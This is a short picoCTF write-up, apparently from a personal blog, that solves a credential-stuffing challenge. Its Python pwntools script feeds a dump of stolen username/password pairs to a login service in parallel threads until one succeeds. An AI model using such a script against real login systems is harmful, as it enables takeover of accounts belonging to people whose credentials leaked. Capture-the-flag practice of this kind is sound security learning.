+++
date = '2026-04-20'
draft = false
title = 'Pico Credential Stuffing writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

## Overview

Credential stuffing is the automated injection of stolen username and password pairs (“credentials”) in to website login forms, in order to fraudulently gain access to user accounts. Since many users will re-use the same password and username/email, when those credentials are exposed (by a database breach or phishing attack, for example) submitting those sets of stolen credentials into dozens or hundreds of other sites can allow an attacker to compromise those accounts too. Download the credentials dump here. There was a recent data breach at a famous department store, in which the login credentials of thousands of users were stolen and dumped online. You're hoping at least one person reused their credentials from the department store for an account at a local bank. Stuff those credentials and get the flag!

---

Quite a mouthful of a description! Anyways, this time we connect to the service via nc, so it's much more like a pwn challenge than a web one.

## Identifying the vulnerabilities

I initially wrote a for loop just iterating through everything, but it was taking forever, so I moved to ThreadPoolExecutor and in a couple of minutes we found the flag! Here's the script:

```py
from pwn import *
from concurrent.futures import ThreadPoolExecutor

def try_creds(line):
    clean_line = line.strip()
    username, password = clean_line.split(';')
    p = remote('crystal-peak.picoctf.net', 55517)
    p.recvuntil(b"Username: ")
    p.sendline(username)
    p.recvuntil(b"Password: ")
    p.sendline(password)
    res = p.recvall()
    if b"Invalid" not in res:
        print(res)
        
f = open("/home/kali/Downloads/creds-dump.txt")
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(try_creds, f)
```

And the flag:
![challenge-screenshot](flag.png#center)





